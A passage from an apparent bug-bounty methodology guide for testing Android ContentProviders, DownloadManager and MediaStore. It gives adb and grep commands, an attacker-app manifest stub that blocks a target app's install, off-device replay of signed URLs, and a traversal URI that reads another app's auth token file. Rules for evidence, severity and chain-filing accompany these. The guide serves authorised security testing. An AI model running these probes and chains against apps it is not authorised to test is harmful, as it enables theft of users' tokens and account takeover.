- **How:**
```bash
grep -rnE 'DownloadManager|setDestinationInExternalPublicDir|setDestinationUri|addRequestHeader|setVisibleInDownloadsUi|allowScanningByMediaScanner' out/sources/
# after downloading an in-app document (invoice, statement, KYC copy, chat attachment):
adb shell ls -la /sdcard/Download/
adb shell content query --uri content://downloads/my_downloads \
  --projection "_id,uri,local_uri,title,status,notificationpackage"
adb shell content query --uri content://downloads/all_downloads
```
- **Proof:** Either `ls -la` showing a per-user document readable outside the sandbox, **or** a
  `content://downloads/my_downloads` row whose `uri` contains `?token=`/`?sig=`/`X-Amz-Signature` that still
  returns 200 when replayed with `curl` from another machine. Replay it off-device — that is what separates
  metadata disclosure from a real finding.
- **Escalation:** -> D07-067 (the signed URL is a backend credential); the public download directory is also
  a **write** target, so chain it to the app's own import routine (D07-061).
- **Ruled out when:** Downloads go to `setDestinationInExternalFilesDir` (app-scoped) or an internal path,
  and the provider row's `uri` column either is absent or returns 401/403 on off-device replay.

### D07-069 · MediaStore cross-owner read and `OWNER_PACKAGE_NAME` redaction

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03/AM-04 |
| **Applies to** | Scoped storage from Android 10 (API 29); `requestLegacyExternalStorage` ignored at targetSdk 30+; `READ_EXTERNAL_STORAGE` has no effect from Android 13 (API 33); `OWNER_PACKAGE_NAME` redaction from Android 14 |
| **Maps to** | MASTG-KNOW-0042, MASTG-TEST-0202, MASTG-TEST-0254, MASTG-TOOL-0004; `about/versions/14/behavior-changes-all` (`OWNER_PACKAGE_NAME` redaction, `QUERY_ALL_PACKAGES`) |

- **Test:** Two questions. (a) Can the app read media belonging to other apps, and does it hold
  `MANAGE_EXTERNAL_STORAGE` to do so? (b) Does the app use `OWNER_PACKAGE_NAME` as a **provenance** check
  ("this file came from a trusted app, so skip validation")? From Android 14 that column is redacted unless
  the owner is always-visible or the caller holds `QUERY_ALL_PACKAGES` — so a trust branch keyed on it now
  fails open on attacker-supplied media.
- **How:**
```bash
grep -nE 'MANAGE_EXTERNAL_STORAGE|READ_MEDIA_IMAGES|READ_MEDIA_VIDEO|READ_MEDIA_AUDIO|READ_MEDIA_VISUAL_USER_SELECTED' out/AndroidManifest.xml
grep -rn 'OWNER_PACKAGE_NAME' out/sources/
adb shell content query --uri content://media/external_primary/images/media
adb shell content query --uri content://media/external_primary/file
# then place a file from a third app and observe which branch the target takes
```
- **Proof:** For (a): the **absence** of
  `java.lang.SecurityException: com.target.app has no access to content://media/external_primary/images/media/<id>`
  on a cross-owner read, or `MANAGE_EXTERNAL_STORAGE` held with no justification in the store listing.
  For (b): a Frida hook on `Cursor.getString` logging a null/redacted owner value while the trust branch
  still executes.
- **Escalation:** -> D17 (a malicious file trusted because of provenance reaches a parser); -> D20 for the
  bulk-media case. Broad file access plus a WebView `file://` primitive -> D10.
- **Ruled out when:** The app reads only its own attributed media (every cross-owner probe throws the
  `no access` SecurityException), does not hold `MANAGE_EXTERNAL_STORAGE`, and makes no authorisation
  decision on `OWNER_PACKAGE_NAME`.

### D07-070 · `androidx.startup` authority collision — HYPOTHESIS, run the experiment before reporting

| | |
|---|---|
| **Severity ceiling** | Low (availability only, **if confirmed**) |
| **VRT** | `application_level_denial_of_service_dos` (VARIES) — but see the doctrine note below |
| **Attacker** | AM-03 |
| **Applies to** | apps using AndroidX App Startup or any fixed-authority initialiser |
| **Maps to** | `topic/libraries/app-startup` (authority format `${applicationId}.androidx-startup`, `android:exported="false"`). **The collision behaviour itself is unverified — do not report it as fact without running the experiment.** |

- **Test:** Android refuses to install a package whose provider authority is already claimed by an installed
  package. **Hypothesis:** an attacker app that pre-registers `com.target.app.androidx-startup` prevents the
  legitimate app from installing (a distribution denial, or a forced sideload/downgrade), or is itself
  rejected if installed second — making this a one-way install DoS rather than a data bug.
- **How:**
```bash
# 1. install an attacker app declaring the target's startup authority
#    <provider android:name=".Stub" android:authorities="com.target.app.androidx-startup"
#              android:exported="false"/>
adb install attacker-authority.apk
# 2. attempt to install the target
adb install target.apk
# 3. observe
adb shell dumpsys package providers | grep androidx-startup
```
  Refuted if step 2 succeeds; confirmed if it fails with a conflicting-provider error.
- **Proof:** The exact installer output from step 2 (e.g. `INSTALL_FAILED_CONFLICTING_PROVIDER`), plus the
  `dumpsys` line showing which package holds the authority. Nothing less.
- **Escalation:** None directly. Report only with the observed installer output, and only to a programme
  that buys availability findings — most do not.
- **Ruled out when:** Step 2 installs successfully, or the app declares no fixed-authority provider outside
  its own `applicationId` namespace. Record the installer output either way.

### D07-071 · Evidence package for a provider finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (deliverable) |
| **Attacker** | n/a |
| **Applies to** | every D07 submission |
| **Maps to** | the five-screenshot state-change pattern; HAR/transcript sanitising and the PII split (mask the secret, leave the correlation data visible); `docs/04-poc-and-evidence-standard.md` |

- **Test:** A provider read needs the bytes; a provider **write** needs a state change, and a state change
  needs five artefacts, not one. Capture them in one sitting — re-running the app between captures
  regenerates state and invalidates the earlier ones.
- **How:** For a write finding, in this order, named
  `{finding-#}-step{n}-{description}.png` and referenced by filename in the body:
  1. **Pre-state** — `content query` showing the row before, with your marker absent
     (`grep -c "$M" baseline.txt` = 0, per D07-047).
  2. **The bug** — the `content insert`/`update`/`call` succeeding from an app UID with no permissions.
     The most important artefact.
  3. **Post-state negative** — the old value no longer present.
  4. **Post-state positive** — the new value present, marker visible.
  5. **Side effect** — the app's UI or the backend reflecting the change, or the absence of any
     notification to the user (which proves whether a passive defence exists).

  Sanitising, ranked by practicality: (A) do not capture the secret at all — screenshot the row with the
  token column projected out, and keep the full capture locally for the triager via the platform's private
  attachment system, never email; (B) black-bar in an image editor; (C) find/replace on transcripts:
```bash
sed -E 's/(access_token|refresh_token|Authorization|password|pin)=[^,[:space:]]+/\1=<REDACTED>/g' \
  provider_dump.txt > provider_dump.sanitised.txt
grep -iE 'token|password|bearer' provider_dump.sanitised.txt | head   # verify
```
  **Leave visible** — the triager needs them: the authority and URI, your own attacker uid/package, the
  column *names*, request/trace ids, the exact exception strings, and the `Required Permission - Read: null`
  line. **Mask** — token values, password hashes, other users' PII, the device's IMEI/serial.
- **Proof:** Five numbered cross-referenced artefacts plus a sanitised transcript, with the unredacted
  originals retained locally. After submission, rotate the test account's credentials so anything visible in
  a screenshot is already dead.
- **Escalation:** n/a.
- **Ruled out when:** n/a — unconditional for every write or state-change finding in this domain.

### D07-072 · Pre-severity gate against the Critical claim, not against the bug

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (governance) |
| **Attacker** | n/a |
| **Applies to** | every D07 Critical or High claim |
| **Maps to** | the Pre-Severity Gate and retraction discipline; `docs/02-severity-and-reportability.md` |

- **Test:** Write the draft Critical title, then substitute the **Critical claim** — not the bug — into each
  question. This domain generates confirmed primitives that do not complete a chain more than any other,
  because a provider read is genuinely exciting and genuinely often ends at a value the backend rejects.
  1. Have I validated the full chain to attacker-attainable impact, or only one primitive? "Traversal
     confirmed" is not "account takeover".
  2. What does the attacker walk away with, in one concrete sentence?
  3. Have I personally reproduced the full chain end to end at least twice — once on discovery, once for
     the PoC — and from an **app UID** both times (D07-007)?
  4. Is there still a gate? A token that is device-bound, a refresh that requires an attestation, a file
     that is encrypted with a Keystore key you cannot use off-device. If yes, it is "primitive present" at
     a lower severity, documented honestly.
  5. Has the programme rejected this class before? Nextcloud's published carve-out for same-device apps is
     the standing example — check it before, not after.
- **How:** Record the five answers in the working notes before drafting. For anything Critical or High,
  reproduce through **two independent stacks**: `adb shell content` and a PoC app's `ContentResolver`, or
  drozer and a PoC app. Cross-tool consistency rules out tool artefacts.
- **Proof:** The five answers plus two independent reproductions in the report.
- **Escalation:** When a claim fails the gate, downgrade it and write the retraction into the appendix
  rather than silently dropping it:
```markdown
### Retracted: <finding name>
- **Original signal:** <what looked like a bug>
- **Disproving evidence:** <reproduction step + observation>
- **Why it looked like a bug:** <marker collision / shell-UID artefact / status-only confidence>
- **Retraction date:** <YYYY-MM-DD>
```
  The inverse rule matters just as much here: **do not retract a confirmed finding that stopped
  reproducing because the client patched mid-engagement.** Keep the timestamped pre-patch `content query`
  output — providers are easy to fix quietly, and a same-day patch is common.
- **Ruled out when:** n/a — unconditional for every Critical/High in this chapter.

### D07-073 · Chain-filing order for provider primitives

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (submission mechanics) |
| **Attacker** | n/a |
| **Applies to** | every D07 finding that feeds another domain |
| **Maps to** | chain-filing order: primitives first so their ids exist, then the consumer, then backfill the links; "one fix equals one bounty" — a chain is a severity amplifier, not a merge request |

- **Test:** D07 is a primitive factory: the traversal, the over-broad paths XML, the grant configuration and
  the injection each have **independent fix surfaces**, and each becomes Critical only in combination with
  a consumer in D08, D15 or D17. Filing them as one giant report loses money and confuses triage; filing
  them without cross-references loses the severity.
- **How:**
  1. Identify the highest-severity chained outcome (usually "token theft -> ATO" or "arbitrary write ->
     code execution").
  2. File each primitive separately at its standalone severity, with a placeholder cross-reference line:
     e.g. the FileProvider `<root-path>` config (D07-054), the redirector that issues the grant (D08), the
     loader that executes the written file (D17).
  3. File the chain consumer with the full narrative at the chained severity, filling in the real primitive
     ids.
  4. Edit each primitive to backfill the consumer's id.
```markdown
## Chain partners (filed as separate reports)
- **submission [UUID-1]** — FileProvider `<root-path path="."/>` exposes the app data directory
- **submission [UUID-2]** — `ShareActivity` forwards an attacker Intent with FLAG_GRANT_READ_URI_PERMISSION
These primitives have independent fix surfaces and are filed separately per the programme's
"one fix = one bounty" rule.
```
- **Proof:** Cross-referenced submissions. Do not paste the whole chain narrative into every primitive, do
  not claim each primitive is independently Critical, and do not ask for a single combined bounty.
- **Escalation:** Open the severity request in the consumer's first body section, naming the VRT node you
  chose and the priority you are asking for, with the reachability proof as the reasoning.
- **Ruled out when:** n/a — mechanics.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Exported ContentProvider" flagged by a scanner on an app targeting SDK 34 with an explicit `signature`-level `readPermission` | The permission gate holds; export is a design decision, not a defect | Show the protectionLevel is `normal`/`dangerous` (D07-013), or a path variant that bypasses the gate (D07-019) |
| The `targetSdk < 17` default-export rule fired on a modern app | The default has been `false` since Android 4.2; MobSF gates it on `min_sdk < 17` and reports anyway | The manifest genuinely declares `targetSdkVersion < 17`, quoted from `aapt dump badging` |
| `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws `SecurityException: Provider must grant uri permissions` | The **path scope** is over-broad (D07-054) or a grant reaches an attacker (D07-021/-022) |
| `<root-path>` present, provider not exported, no grant path, no URI sink in the app | A configuration observation with no reachable caller; it is a blast-radius multiplier waiting for a primitive | Any of: the provider is exported, a redirector issues grants (D08), or the app opens attacker URIs (D07-053) |
| Sensitive data found in `/data/data/<pkg>` via `run-as` or root | AM-12 is not an attack, and the VRT prices it at P5 (`insecure_data_storage...on_internal_storage`). Xiaomi, Grab and Spotify all list app-private storage explicitly out of scope; Google: "Access to non-sensitive internal files of another app also does not qualify" | Pair it with a provider read, traversal or grant that a non-root third party can use, and refile as the **access** bug with the data as the payload |
| `adb shell content query` returns rows but the same query from a PoC app throws `SecurityException` | `shell` is uid 2000 and holds permissions no third-party app has | Reproduce from an app UID (D07-007). If it only works from `shell`, it is an artefact |
| drozer `scanner.provider.traversal` / `scanner.provider.injection` reporting "Not Vulnerable" | One payload against one file, and a single-error-string oracle respectively | The manual matrix (D07-029) or the `1=1`/`1=0` body diff (D07-046) plus a source-level check |
| `/etc/hosts` canary failing | Some OEM SELinux policies block it outright; the scanner's only oracle silently reads empty | Re-run with `/proc/version`, which is readable on API 30+, and state the policy caveat |
| A provider crash from a malformed URI or a null extra | VRT `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, and it is a self-inflicted local crash | The crash is a memory-safety primitive in native provider code, or it is persistent (crash-on-launch) — then it is a D19/D04 finding, not D07 |
| Unbounded `insert` growing the app's database ("flood the provider") | App-local availability loss with no confidentiality impact; most programmes rate it Low or out of scope | The provider backs a critical-path service **and** the programme buys availability — quote the before/after `du -sh` figures and the failure state |
| Provider SQL injection reachable only through the app's own UI | You are injecting into your own database, as your own user | The same concatenation is reachable through an **exported** provider's `selection`/`projection`/`sortOrder`, i.e. attacker-controlled by any installed app |
| A `MediaStore` / `Downloads` row returned to your own app | Those providers are designed to be readable; the platform's `SecurityException` on cross-owner reads is the control working | A cross-*owner* read succeeding, or a signed URL in a row that replays off-device (D07-068) |
| `takePersistableUriPermission` present in the app's code | Defensive use is normal SAF practice | The app **hands out** persistable grants and never revokes them, and you still read after reboot and after the user deleted the item (D07-024) |

## Cross-surface joins

- **D07 × D08 — the paths XML and the redirector.** Nobody reads `res/xml/file_paths.xml` and
  `startActivity(getIntent().getParcelableExtra(...))` in the same sitting. The XML decides what a grant
  reaches; the redirector decides who gets one. Individually: a config note and a "component forwards an
  intent". Joined: `content://<pkg>.fileprovider/root/data/data/<pkg>/shared_prefs/auth.xml` read by a
  zero-permission app. This is the single highest-yield join in the chapter, and it is the reason
  `exported="false"` is never a ruled-out basis on its own (D07-022).
- **D07 × D03 — the provider line and the permission line.** A provider guarded by
  `com.target.app.permission.READ_DATA` reads as protected in the manifest review, and the
  `<permission android:protectionLevel="normal">` two hundred lines above reads as unremarkable in the
  permission review. Join them and the guard is auto-granted to any app that asks (D07-013).
- **D07 × D17 — the write primitive and the loader.** A traversal that honours `"w"` is Medium on its own
  and the Google Mobile VRP says so explicitly. Enumerate `System.load`/`DexClassLoader`/plugin directories
  *first*, choose the destination to match, and the same primitive is the VRP's top-paying category
  (D07-032, D07-059).
- **D07 × D15 — provider rows as the backend's keys.** Object ids, share tokens and API version strings sit
  in provider rows, and the mobile client's API version is usually older than the web app's. The local read
  is Low at a programme that discounts same-device apps; the forged public share URL from the same token is
  a remote finding at the same programme (H1 #518669). Always take the row off-device (D07-067).
- **D07 × D10 — `setAllowContentAccess` is on by default.** A WebView that loads any untrusted content can
  `XMLHttpRequest` a `content://` URI. The WebView reviewer tests XSS and origins; the provider reviewer
  tests `adb shell content`. Neither tests the provider *from inside the WebView*, which is where the
  app's own authority is reachable without any IPC at all (MASTG-TEST-0250).
- **D07 × D09 — deep-link parameters that name a URI.** `targetapp://share?file=...` and
  `?uri=content://...` are tested for open redirect and XSS and never for a `content://` or `file://`
  payload aimed at the app's own provider. That is the AM-02 delivery route into D07-053 and D07-056.
- **D07 × D11 — reachability is what converts storage into a finding.** An unencrypted token in
  `shared_prefs` is P5 by VRT and explicitly out of scope at several programmes. The provider traversal is
  the thing that makes it a P1 read. File the access as the bug and the storage as the payload — never the
  other way round.
- **D07 × D05/D13 — the telephony provider and the OTP.** A blind `update()` oracle on an OEM provider that
  shares a database file with `sms` (CVE-2025-10184) reads OTP bodies with no `READ_SMS`. The SMS reviewer
  looks at the receiver and the permission; the provider reviewer looks at the columns. The join is
  account takeover on every service that uses SMS 2FA.
- **D07 × D02 — the merged manifest is where the SDK's provider lives.** The app's own source contains no
  `FileProvider`, so the source reviewer records a negative; the merged manifest contains three, each with
  its own paths XML written by a vendor the client has never audited (D07-003).
- **D07 × D19/D04 — the side-effecting `call()` and the crash surface.** A `call()` method table
  (D07-016) is simultaneously the richest authorisation-bypass surface and the best-shaped fuzzing corpus
  in the app. Enumerate once, use twice.

## Sources

- **OWASP MASTG / MASVS** — MASTG-TEST-0355, -0356, -0357, -0339, -0025, -0250, -0202, -0254;
  MASTG-TECH-0148, -0159, -0163; MASTG-KNOW-0042, -0117, -0138; MASTG-TOOL-0004, -0015, -0110;
  MASWE-0002, -0018, -0036, -0050; rules `mastg-android-content-provider-exported.yml`,
  `mastg-android-fileprovider-broad-scope.yml`, `mastg-android-sql-injection-contentprovider.yml`.
  Identifiers cross-checked against `data/mastg-android-tests.csv`, `-techniques.csv`, `-rules.csv`.
- **Android platform documentation** — `guide/topics/manifest/provider-element` (`readPermission`,
  `writePermission`, `grantUriPermissions`, `<path-permission>`, `<grant-uri-permission>`);
  `guide/topics/providers/content-provider-creating`; `guide/components/intents-filters` (the data-test
  rule for MIME-only filters); `risks/content-resolver`, `risks/file-providers`, `risks/path-traversal`,
  `risks/sql-injection`, `risks/untrustworthy-contentprovider-provided-filename`;
  `training/data-storage/shared/photopicker`; `guide/slices/getting-started`; `topic/libraries/app-startup`;
  `reference/android/app/DownloadManager`; AOSP `ContentProvider.java` javadoc for
  `getCallingPackage()`/`getCallingPackageUnchecked()`; AndroidX `FileProvider.java` (`TAG_ROOT_PATH`).
- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) for every priority quoted,
  including the P5 pinning of the entire mobile branch and the P1 nodes this chapter routes findings into.
- **Google Mobile VRP and vendor programme rules** — the "Theft of sensitive data" and "Private data
  overwrite due to path traversal" classes, the arbitrary-file-write-must-demonstrate-ACE rule, and the
  Xiaomi / Grab / Spotify app-private-storage exclusions.
- **Disclosed reports** — H1 #291764, #518669, #242727, #331302, #534541, #489105, #1161401, #3696266,
  #1997029 (Nextcloud / Nextcloud Talk); #1650264, #146179, #161710 (ownCloud, GHSL-2022-059/060,
  GHSA-36f7-93f3-mcfj); #1115864 (Mattermost), #1362313 / #1377748 (Evernote); #887968, #143280 (Mail.ru);
  #272044 (Dropbox); #876192, #288955 (IRCCloud); #859469, #284346 (LINE).
- **CVEs and advisories** — CVE-2026-28576 / GHSA-ph86-9mcx-3p6r (Android 17 Contacts Provider balanced
  subquery, PoC `github.com/mobilehackinglab/CVE-2026-28576-poc`, compat change `ENFORCE_STRICT_SQL_CHECKS`
  id 484953293); CVE-2025-10184 (OnePlus OxygenOS telephony provider); CVE-2025-48636, CVE-2025-48609
  (`BugreportContentProvider`, `MmsProvider`); CVE-2024-43089, CVE-2023-35670 (MediaProvider `openFile`);
  CVE-2022-20518 / OSV PUB-A-224770203, CVE-2020-0060, CVE-2014-8507 (EDB 35382), CVE-2018-20523 (EDB 50188);
  CVE-2019-14339 (EDB 47321); CVE-2020-6516, CVE-2021-24027 (`content://` from the web layer).
- **Oversecured** — "Content Providers and the potential weak spots they can have", "Android security
  checklist: theft of arbitrary files", "Gaining access to arbitrary Content Providers", "Why dynamic code
  loading could be dangerous for your apps: a Google example", the OVAA `TheftOverwriteProvider`, and the
  TikTok `<root-path path=""/>` chain.
- **Microsoft "Dirty Stream"** (2024-05-01) — Xiaomi File Manager and WPS Office, and the `checkValid`
  normalisation caveat.
- **Tooling, read at source** — drozer `app.provider.info|columns|query|insert|update|delete|call|read|download|finduri`,
  `scanner.provider.finduris|injection|sqltables|traversal`, `auxiliary.webcontentresolver`, and the actual
  probe logic in `scanner/provider/traversal.py` and `scanner/provider/injection.py`; QARK
  `INSECURE_FUNCTIONS_NAMES = ("call",)`; MobSF `exported_provider*` matrix and `ANDROID_4_2_LEVEL = 17`;
  mindedsecurity `MSTG-PLATFORM-2_2/2_3/2_4` and its dangerous-path regex `^[\/\.\*]\/?$`.
- **Community checklists and write-ups** — HackTricks (`exploiting-content-providers.md`,
  `content-protocol.md`, `android-applications-basics.md`, `intent-injection.md`), sec-88 "Content Provider
  Hacking" and "Hacking InsecureBankv2", Het Mehta Phase 3, hackwithsingh sec-14 series, Indusface,
  YesWeHack Android recon guide, B3nac and saeidshirazi indexes, Mobile Hacking Lab and the MAST Guide,
  devploit on the Google Messages `AvatarContentProvider`.
- **The 4,467-star bug-hunting corpus** — the layer-ordering trap (D07-006), marker discipline (D07-047),
  the body-diff and statistical-sample rules (D07-046), the shell-loop ban (D07-008), the shadow-API
  mobile-to-backend bridge (D07-067), evidence hygiene and the five-screenshot pattern (D07-071), the
  pre-severity gate and retraction discipline (D07-072), and chain-filing order (D07-073).
- **MITRE ATT&CK Mobile** — T1409 Stored Application Data, T1533 Data from Local System, T1636 Protected
  User Data (.001–.005), T1641 Data Manipulation, verified against `data/mitre-attack-mobile-android.csv`.
